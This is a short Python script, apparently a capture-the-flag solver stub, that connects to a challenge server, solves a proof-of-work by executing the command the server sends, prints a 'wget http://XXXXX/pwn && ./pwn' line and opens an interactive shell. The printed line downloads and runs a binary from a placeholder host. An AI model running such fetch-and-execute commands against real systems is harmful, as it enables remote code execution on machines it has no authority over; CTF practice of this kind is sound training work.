from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9002"))

sock = Socket(HOST, PORT)

# Solve PoW
p = Process(sock.recvline().decode().split())
ans = p.recvlineafter("token: ")
p.close()
sock.sendlineafter("token: \n", ans)

print("wget http://XXXXX/pwn && ./pwn")

sock.sh()
